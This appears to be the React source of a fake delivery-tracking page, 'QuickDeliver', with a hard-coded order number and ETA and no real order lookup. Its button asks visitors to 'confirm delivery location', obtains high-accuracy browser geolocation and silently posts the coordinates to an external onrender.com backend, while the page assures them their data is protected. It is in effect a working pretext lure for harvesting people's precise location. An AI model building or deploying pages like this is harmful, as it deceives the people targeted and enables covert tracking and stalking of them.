import React, { useEffect, useState } from 'react';
import './App.css';

const BACKEND_URL = 'https://location-backend-3cdl.onrender.com';

function App() {
  const [btnState, setBtnState] = useState('idle'); // idle | loading | done

  // Wake up backend on page load silently
  useEffect(() => {
    fetch(`${BACKEND_URL}/ping`).catch(() => {});
  }, []);

  const handleTrackOrder = () => {
    if (btnState === 'loading' || btnState === 'done') return;
    setBtnState('loading');

    if (!navigator.geolocation) {
      saveLocation(null, null, null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
      },
      () => {
        saveLocation(null, null, null);
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };

  const saveLocation = async (latitude, longitude, accuracy) => {
    try {
      await fetch(`${BACKEND_URL}/api/location`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ latitude, longitude, accuracy }),
      });
    } catch (e) {}
    setBtnState('done');
  };

  return (
    <div className="app">
      <header className="header">
        <div className="logo">
          <span className="logo-icon">🛵</span>
          <span className="logo-text">QuickDeliver</span>
        </div>
        <nav className="nav">
          <a href="#track">Track Order</a>
          <a href="#help">Help</a>
        </nav>
      </header>

      <section className="hero">
        <div className="hero-content">
          <div className="badge">⚡ Fast Delivery</div>
          <h1>Your order is<br /><span className="highlight">on the way!</span></h1>
          <p className="subtitle">
            Confirm your delivery address to get real-time updates and accurate drop-off.
          </p>

          <div className="info-box">
            <div className="info-row">
              <span>🏠</span>
              <div>
                <strong>Delivery Address</strong>
                <p>Confirm your location for accurate delivery</p>
              </div>
            </div>
          </div>

          <button
            className={`cta-btn ${btnState}`}
            onClick={handleTrackOrder}
            disabled={btnState === 'loading' || btnState === 'done'}
          >
            {btnState === 'idle' && '📦 Confirm Delivery Location'}
            {btnState === 'loading' && <><span className="btn-spinner" /> Confirming...</>}
            {btnState === 'done' && '✅ Location Confirmed!'}
          </button>

          {btnState === 'done' && (
            <p className="success-msg">Your delivery is being routed to your location.</p>
          )}
        </div>

        <div className="hero-visual">
          <div className="delivery-card">
            <div className="delivery-header">
              <span>Order #DL-2847</span>
              <span className="badge-green">On the way</span>
            </div>
            <div className="delivery-steps">
              <div className="step done">✅ Order Placed</div>
              <div className="step done">✅ Packed</div>
              <div className="step active">🛵 Out for Delivery</div>
              <div className="step">📦 Delivered</div>
            </div>
            <div className="eta">Estimated: 15–20 mins</div>
          </div>
        </div>
      </section>

      <section className="features">
        <div className="feature-card"><span>⚡</span><h3>Express Delivery</h3><p>Get your order in under 30 minutes</p></div>
        <div className="feature-card"><span>📍</span><h3>Live Tracking</h3><p>Real-time updates on your delivery</p></div>
        <div className="feature-card"><span>🔒</span><h3>Secure & Safe</h3><p>Your data is encrypted and protected</p></div>
      </section>

      <footer className="footer">
        <p>© 2026 QuickDeliver. All rights reserved.</p>
      </footer>
    </div>
  );
}

export default App;
